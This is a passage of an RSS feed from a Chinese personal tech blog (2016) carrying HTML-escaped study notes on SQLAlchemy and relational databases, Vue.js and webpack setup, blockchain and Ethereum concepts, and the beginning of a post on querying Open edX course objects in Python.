&lt;h1&gt;心得&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库的重点是表，操作可以用python方法，为了查询的灵活，还是需要sql&lt;/li&gt;
&lt;li&gt;用好ORM的前提是了解关系数据库的概念和典型用例&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;理解&lt;/h3&gt;
&lt;p&gt;数据库表是一个二维表，包含多行多列。把一个表的内容用Python的数据结构表示出来的话，可以用一个list表示多行，list的每一个元素是tuple，表示一行记录&lt;/p&gt;
&lt;p&gt;行，想象为二维数据(csv),外键是一种关系  &lt;/p&gt;
&lt;h3&gt;通用技能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多维数据的可视化 （降维）是一个常见的问题模式 。如何聚合，pandas部分&lt;/li&gt;
&lt;li&gt;帆船项目 帮助理解pandas如何用于web流&lt;ul&gt;
&lt;li&gt;如何实时读取sql，这样一来oricle问题就解决了 可视化问题&lt;/li&gt;
&lt;li&gt;从真实数据学习数据图表化的原理  《网站分析》&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;投资技能 pandas -&amp;gt; scikit-learn   &lt;/li&gt;
&lt;li&gt;edx的log先导入数据库  保留关系 然后变为扁平化数据  &lt;ul&gt;
&lt;li&gt;将log导入数据库是为了获得强大的查询能力  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对sql的使用场景要有所了解  适合作什么&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/SQLAlchemy"&gt;SQLAlchemy 维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0014021031294178f993c85204e4d1b81ab032070641ce5000"&gt;使用SQLAlchemy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://forta.com/books/0672336073/"&gt;SQL必知必会 源码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/e6bba189fcbd"&gt;SQLAlchemy 简单笔记&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 03 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-03:relational-database-summary.html</guid><category>code</category></item><item><title>vuejs与webpack学习笔记</title><link>/vue-and-webpack-note.html</link><description>&lt;p&gt;阮一峰在微博里说：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;前端变化有多快？两年前，大家都用Grunt构建，去年用Gulp + Browserify构建，今年用Webpack构建，明年可能会使用纯ES6的构建工具。每变一次，前面的那些工具就全没用，都白学。要知道，这些工具每一个都是软件系统，单单Grunt就有4千个插件，然而全没用了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;nodejs相关&lt;/h1&gt;
&lt;p&gt;国内使用npm有时候不太顺利，可以考虑使用淘宝的镜像。&lt;/p&gt;
&lt;p&gt;npm install -g webpack  --registry=http://registry.npm.taobao.org&lt;/p&gt;
&lt;h1&gt;vuejs&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;文档 ：&lt;a href="https://vuejs.org.cn/guide/"&gt;vuejs.org.cn&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.webpackbin.com/vue"&gt;在线体验&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;官方索引: &lt;a href="https://github.com/vuejs/awesome-vue"&gt;awesome-vue&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;开发工具:&lt;/li&gt;
&lt;li&gt;命令行工具 vue-cli （面向组件开放的项目都建议使用这个官方工具初始化）&lt;/li&gt;
&lt;li&gt;命令行工具Webpack 插件 &lt;a href="https://github.com/vuejs/vue-loader"&gt;vue-loader&lt;/a&gt; ： for single file Vue components&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/vuejs/vue-loader-example/"&gt;vue-loader-example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://segmentfault.com/a/1190000004060034"&gt;vue组件化开发初体验-示例vue-loader-example学习记录&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;源码:&lt;a href="https://github.com/dingyiming/learn-Js-vuejs/tree/master/demos/demo-vue-loader-example/demo1"&gt;dingyiming/learn-Js-vuejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;vue文件将由vue-loader进行加载，.vue内同时包含html、css、js源码，使组件的独立，组件之间可以尽可能地解耦，便于开发维护&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;命令行工具Browserify 插件 vueify&lt;/li&gt;
&lt;li&gt;命令行工具Chrome 插件 vue-devtools&lt;/li&gt;
&lt;li&gt;xhr&lt;/li&gt;
&lt;li&gt;vue-resource &lt;/li&gt;
&lt;li&gt;UI 库：&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yuche/vue-strap"&gt;vue-strap&lt;/a&gt; （不依赖 BootStrap 的 JS 和 jQurey，但是仍需要 BootStrap 的 CSS。）&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/okoala/vue-antd"&gt;vue-antd&lt;/a&gt; 蚂蚁金服 ant design 的 Vue 实现（不够完善，但是看起来比 vue-strap 好看些。&lt;/li&gt;
&lt;li&gt;路由&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vuejs/vue-router"&gt;vue-router&lt;/a&gt;（官方 router）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a href="https://github.com/webpack/webpack"&gt;webpack&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;目前前端领域工具异常丰富，webpack是黏合它们的胶水，可以作为入口，如果手动拼接，极其琐碎&lt;/p&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/webpack/webpack/tree/master/examples"&gt;examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ruanyf/webpack-demos"&gt;ruanyf/webpack-demos&lt;/a&gt;：建议以这个作为入门&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;教程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yesvods/Blog/issues/3"&gt;前端webpack workflow（二）——Webpack基本使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/1c4fd72b84e8"&gt;webpack入门(译)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;gitbook:&lt;a href="http://webpack.toobug.net/zh-cn/chapter1/index.html"&gt;webpack指南&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zfanw.com/blog/webpack-tutorial.html"&gt;webpack 使用教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;vuejs与webpack相关案例&lt;/h1&gt;
&lt;h2&gt;&lt;a href="https://github.com/vuejs/vue-hackernews"&gt;vue-hackernews&lt;/a&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;HackerNews clone with Vue.js&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;vuejs官方的案例&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://vuejs.org.cn/guide/application.html"&gt;构建大型应用 组件化&lt;/a&gt;：组件（Component）是 Vue.js 最强大的功能之一&lt;/li&gt;
&lt;li&gt;sudo npm install --registry=http://registry.npm.taobao.org&lt;/li&gt;
&lt;li&gt;网站的信息来自: wss://s-usc1c-nss-136.firebaseio.com/.ws?v=5&amp;amp;ns=hacker-news&lt;ul&gt;
&lt;li&gt;用到了firebase&lt;/li&gt;
&lt;li&gt;调试wss&lt;ul&gt;
&lt;li&gt;python3， pip install websocket&lt;/li&gt;
&lt;li&gt;wsdump.py&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://github.com/zerqu/qingcheng"&gt;qingcheng&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;qingcheng是&lt;a href="http://python-china.org/"&gt;python-china&lt;/a&gt;的前端&lt;/p&gt;
&lt;p&gt;qingcheng的后端为&lt;a href="https://github.com/lepture/zerqu"&gt;zerqu&lt;/a&gt;,基于flask写的，专注于提供api&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;not a forum, it is an API based application&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;开发&lt;/h3&gt;
&lt;p&gt;mac下，nodejs升级为v5.0,nodejs太旧会有问题&lt;/p&gt;
&lt;p&gt;开始：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sudo npm install&lt;/li&gt;
&lt;li&gt;make dev&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意: webpack-dev-server&lt;/p&gt;
&lt;h3&gt;生产环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;make build&lt;/li&gt;
&lt;li&gt;python -m SimpleHTTPServer 8000&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://github.com/kxxoling/vue-demos"&gt;vue-demos&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;sudo npm install sass-loader node-sass webpack --save-dev --registry=http://registry.npm.taobao.org&lt;/li&gt;
&lt;li&gt;sudo npm install &lt;/li&gt;
&lt;li&gt;npm run dev&lt;ul&gt;
&lt;li&gt;会解释为：webpack-dev-server --inline --hot --config webpack.dev.conf.js&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;npm run build&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="https://github.com/dingyiming/demo-Vue-sign"&gt;demo-Vue-sign&lt;/a&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;用vue组件化做个简单的注册登陆SPA页面示例&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;h3&gt;&lt;a href="http://www.jianshu.com/p/941bfaf13be1"&gt;webpack-dev-server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;webpack 提供了 webpack-dev-server 解决实时刷新页面的问题，同时解决实时构建的问题&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;js 文件修改&lt;/li&gt;
&lt;li&gt;webpack-dev-server 监控到变化&lt;/li&gt;
&lt;li&gt;webpack 在内存中重新构建 bundle.js&lt;/li&gt;
&lt;li&gt;webpack-dev-server 保证页面引用的 bundle.js 文件与内存中一致&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/34449620"&gt;如何评价阮一峰关于前端工具变化快的言论？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.windrunner.info/fe/vue-note.html"&gt;Vue.js 学习笔记&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 30 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-30:vue-and-webpack-note.html</guid><category>tools</category></item><item><title>区块链学习笔记</title><link>/blockchain-note.html</link><description>&lt;p&gt;未来正不断到来，而当下不断成为过去&lt;/p&gt;
&lt;p&gt;过去人们眼中惊世骇俗的事物，今天的人已经习以为常，他们不能相信曾经居然有人会对此感到惊讶&lt;/p&gt;
&lt;p&gt;他们同时又惊讶于，当下居然有人会激进和愚蠢到相信眼前这些惊世骇俗的事物在将来能被人广泛接受。它们多么有悖于今天的常识啊&lt;/p&gt;
&lt;p&gt;当尼尼微城昌盛一时，新福音书已经老旧&lt;/p&gt;
&lt;h1&gt;区块链&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;区块链（英语：Blockchain或Block chain）是一种分布式数据库，起源自比特币。&lt;/li&gt;
&lt;li&gt;区块链是一串使用密码学方法相关联产生的数据块，每一个数据块中包含了一次比特币网络交易的信息，用于验证其信息的有效性（防伪）和生成下一个区块。&lt;/li&gt;
&lt;li&gt;区块链在网络上是公开的，可以在每一个离线比特币钱包数据中查询。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;问题背景&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/27687960/answer/94011340"&gt;区块链技术是什么？未来可能用于哪些方面？ 文浩的回答&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;“原理"和"意义/用途"&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/27687960/answer/38301765"&gt;区块链技术是什么？未来可能用于哪些方面？ Alex Zhao的回答&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;区块链的一些要素&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;包含一个分布式数据库&lt;/li&gt;
&lt;li&gt;分布式数据库是BC的物理载体，BC是交易的逻辑载体，所有核心节点都应包含该条BC数据的全副本&lt;/li&gt;
&lt;li&gt;BC按时间序列化Block，且是整个网络交易数据的主体&lt;/li&gt;
&lt;li&gt;BC只对添加有效，对其他操作无效&lt;/li&gt;
&lt;li&gt;基于非对称加密的公私钥验证&lt;/li&gt;
&lt;li&gt;记账节点要求拜占庭将军问题可解/避免&lt;/li&gt;
&lt;li&gt;共识过程(consensus progress)是演化稳定的，即面对一定量的不同节点的矛盾数据不会崩溃。&lt;/li&gt;
&lt;li&gt;共识过程能够解决double-spending问题&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;系统特征&lt;/h3&gt;
&lt;p&gt;它几乎无懈可击。首先你不能凭空造出比特币，只能挖矿获得；其次你无法伪造交易，无法控制不属于你的账户。一旦交易被确认，几乎无法取消。我这里说“几乎”，是因为有“51%攻击”的存在。而51%攻击条件非常苛刻。&lt;/p&gt;
&lt;h1&gt;相关知识&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;密码学&lt;ul&gt;
&lt;li&gt;非对称加密，公钥和私钥&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;p2p&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;一些理解角度&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;比特币本质是构造了一个永不停息、无坚不摧的时间戳系统。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;比特币&lt;/h1&gt;
&lt;p&gt;参考&lt;a href="https://www.zhihu.com/question/20941124"&gt;比特币 (Bitcoin) 系统是如何运行的？&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;公钥私钥&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;公钥私钥是现代密码学分支非对称性加密里面的名词，通常都是用公钥加密信息，用私钥解密信息，为什么要这样？ 因为你看电视剧的时候，发电报那种都是对称性加密，这种加密方式缺点是显而易见的，如果被人知道了密钥和加密方法，于是按照加密方法反着来就能解密。 一直到非对称性加密这种情况才有所改观，公钥就是可以对全世界公开的密钥，比如你和google通讯，用google给的1024位的公钥加密，送到google那里只有他有对应的私钥，只有他能解密，于是就保证了通讯安全&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;椭圆曲线签名算法(ECDSA)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;只要知道私钥，可以算出相应的公钥；&lt;/li&gt;
&lt;li&gt;你用私钥签名过的东西，可以用公钥算一下是不是你签的；&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;交易账单&lt;/h3&gt;
&lt;p&gt;比特币其实没有钱包，只有交易账单，整个比特币就是一大堆交易账单&lt;/p&gt;
&lt;h3&gt;账户&lt;/h3&gt;
&lt;p&gt;比特币的账户，就是一段公钥&lt;/p&gt;
&lt;h3&gt;比特币的账单&lt;/h3&gt;
&lt;p&gt;FROM（谁发送的，包括两部分）&lt;br /&gt;
Previous tx: 你要花的这笔钱的那个账单的id， 也就是说，你花的任何一笔钱都应该有人转给你过，需要出示那个账单的id&lt;br /&gt;
scriptSig: 你对这笔交易的签名，就是把单子用你的私钥做hash，只有你能做这个hash  &lt;/p&gt;
&lt;p&gt;TO（谁接受，包括两部分）&lt;br /&gt;
Value: 要发多少&lt;br /&gt;
scriptPubKey: 对方的公钥，比特币账户就是一段公钥  &lt;/p&gt;
&lt;h1&gt;以太坊&lt;/h1&gt;
&lt;h2&gt;关于以太坊&lt;/h2&gt;
&lt;p&gt;简而言之，以太坊（Ethereum）是一项将比特币中的一些技术和概念运用于计算领域的创新。&lt;br /&gt;
比特币被认为是一个系统，该系统维护了一个安全地记录了所有比特币账单的共享的全球账簿。以太坊，则是利用了很多跟比特币类似的机制（比如区块链技术和 P2P 网络），来维护一个共享的计算平台，这个平台可以灵活且安全地运行用户想要的任何程序（当然也包括类似比特币的区块链程序）&lt;/p&gt;
&lt;p&gt;以太坊要实现的是一个内置了编程语言的区块链协议，由于支持了编程语言，那么理论上任何区块链应用都可以用这门语言进行定义，进而作为一种应用，运行于以太坊的区块链协议之上（译注：该协议的意义与互联网时代的 TCP/IP 协议有的一拼）&lt;/p&gt;
&lt;p&gt;比特币经常被称之为"全球账簿"，以太坊可以被看作一台“全球计算机”&lt;/p&gt;
&lt;p&gt;本质上，以太坊的目标，就是将区块链技术所具有的去中心化、开放、和安全这三大特点，引入到几乎所有能被计算的领域。&lt;/p&gt;
&lt;h2&gt;基本概念&lt;/h2&gt;
&lt;h4&gt;公钥加密系统&lt;/h4&gt;
&lt;p&gt;Alice有一把公钥和一把私钥。她可以用她的私钥创建数字签名，而Bob可以用她的公钥来验证这个签名确实是用Alice的私钥创建的，也就是说，确实是Alice的签名&lt;/p&gt;
&lt;h4&gt;点对点网络&lt;/h4&gt;
&lt;p&gt;就像BitTorrent, 以太坊分布式网络中的所有节点都地位平等，没有中心服务器&lt;/p&gt;
&lt;h4&gt;区块链&lt;/h4&gt;
&lt;p&gt;区块链就像是一个全球唯一的帐簿，或者说是数据库，记录了网络中所有交易历史。&lt;/p&gt;
&lt;h4&gt;节点&lt;/h4&gt;
&lt;p&gt;你可以运行节点，通过它读写以太坊区块链，也即使用以太坊虚拟机。完全节点需要下载整个区块链。轻节点仍在开发中。&lt;/p&gt;
&lt;h4&gt;矿工&lt;/h4&gt;
&lt;p&gt;挖矿，也就是处理区块链上的区块的节点。&lt;/p&gt;
&lt;h4&gt;以太币&lt;/h4&gt;
&lt;p&gt;缩写ETH。一种你可以购买和使用的真正的数字货币&lt;/p&gt;
&lt;h4&gt;工作量证明&lt;/h4&gt;
&lt;p&gt;矿工们总是在竞争解决一些数学问题。第一个解出答案的(算出下一个区块)将获得以太币作为奖励&lt;/p&gt;
&lt;h4&gt;Gas&lt;/h4&gt;
&lt;p&gt;(汽油) 在以太坊上执行程序以及保存数据都要消耗一定量的以太币，&lt;/p&gt;
&lt;h4&gt;DApp&lt;/h4&gt;
&lt;p&gt;以太坊社区把基于智能合约的应用称为去中心化的应用程序(Decentralized App)。DApp的目标是(或者应该是)让你的智能合约有一个友好的界面，外加一些额外的东西，例如IPFS（可以存储和读取数据的去中心化网络，不是出自以太坊团队但有类似的精神)&lt;/p&gt;
&lt;h2&gt;运行以太坊节点可用的客户端&lt;/h2&gt;
&lt;p&gt;Go语言实现的客户端geth (go-ethereum)。 testrpc：使用了Python客户端pyethereum&lt;/p&gt;
&lt;h2&gt;写智能合约用的编程语言&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;类似Javascript的Solidity（主导）&lt;/li&gt;
&lt;li&gt;类Python的Serpent&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;相关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;区块链&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%8C%BA%E5%9D%97%E9%93%BE"&gt;区块链 wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/27687960/answer/94011340"&gt;区块链技术是什么？未来可能用于哪些方面？ 文浩的回答&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/27687960/answer/38301765"&gt;区块链技术是什么？未来可能用于哪些方面？ Alex Zhao的回答&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ethfans.org/posts/You-Can%E2%80%99t-Do-It-Without-a-Blockchain-Here%E2%80%99s-Why"&gt;为什么有些事没有区块链做不了&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blockchaindev.org/article/introduce_blockchain.html"&gt;区块链(BlockChain)的深入介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/bitcoin"&gt;知乎 区块链技术专栏&lt;/a&gt;：维护者：赵余 （扇贝）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;比特率&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20941124"&gt;比特币 (Bitcoin) 系统是如何运行的&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;以太坊：&lt;a href="https://github.com/ethereum"&gt;ethereum&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ethereum/wiki/wiki/%5B%E4%B8%AD%E6%96%87%5D-%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%99%BD%E7%9A%AE%E4%B9%A6"&gt;(中文) 以太坊白皮书&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ethfans.org/"&gt;ethfans&lt;/a&gt;:论坛&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ethfans.org/posts/101-noob-intro"&gt;以太坊智能合约编程之菜鸟教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ethfans.org/posts/what-is-ethereum"&gt;以太坊是什么——以太坊创始人 Vitalik Buterin 的亲自解答&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vbuterin/pybitcointools"&gt;pybitcointools&lt;/a&gt;:SImple, common-sense Bitcoin-themed Python ECC library&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;开发者&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.ethereum.org/author/vitalik-buterin/"&gt;vitalik-buterin&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/vbuterin"&gt;vbuterin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;资讯&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.8btc.com/"&gt;8btc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://qukuai.com/"&gt;qukuai&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 Apr 2016 00:00:00 +0000</pubDate><guid>tag:,2016-04-28:blockchain-note.html</guid><category>tools</category></item><item><title>Open edX course数据探索</title><link>/open-edx-course-data-explore.html</link><description>&lt;h1&gt;方法&lt;/h1&gt;
&lt;p&gt;采用jupyter来探究，基于dogwood做的探索&lt;/p&gt;
&lt;h1&gt;获取course的各种方法&lt;/h1&gt;
&lt;p&gt;需要注意的是各种方法获取的course，关联的数据不尽相同&lt;/p&gt;
&lt;h3&gt;get_courses&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;方法路径： &lt;code&gt;from courseware.courses import get_courses&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;源码:  &lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/djangoapps/courseware/courses.py#L376"&gt;get_courses&lt;/a&gt;,其获取课程的关键是&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/djangoapps/branding/__init__.py#L20"&gt;branding.get_visible_courses&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;相关源码：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;openedx.core.djangoapps.content.course_overviews.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;CourseOverview&lt;/span&gt;
&lt;span class="n"&gt;courses&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CourseOverview&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_all_courses&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;filtered_by_org&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#course = CourseOverview.get_from_id(course_key)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;使用方法:  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.contrib.auth.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;AnonymousUser&lt;/span&gt;
&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AnonymousUser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; 
&lt;span class="n"&gt;courses&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_courses&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;course&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;all_courses&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  &lt;span class="c1"&gt;# CourseOverview object &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;捕获对象：CourseOverview&lt;/li&gt;
&lt;li&gt;一些实用属性和方法:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;course_image_url&lt;/span&gt; &lt;span class="c1"&gt;#&amp;gt;&amp;gt;&amp;gt;u&amp;#39;/asset-v1:edX+DemoX+Demo_Course+type@asset+block@images_course_image.jpg&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt; 
    &lt;span class="n"&gt;course&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_all_course_keys&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;get_all_courses&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_next_by_created&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;max_student_enrollments_allowed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;get_course&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;方法路径： &lt;code&gt;from courseware.courses import get_course&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;源码：&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/lms/djangoapps/courseware/courses.py#L45"&gt;get_course&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;使用方法:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;opaque_keys.edx.locations&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SlashSeparatedCourseKey&lt;/span&gt;
    &lt;span class="n"&gt;course_id_string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;course-v1:a+b+c&amp;quot;&lt;/span&gt;
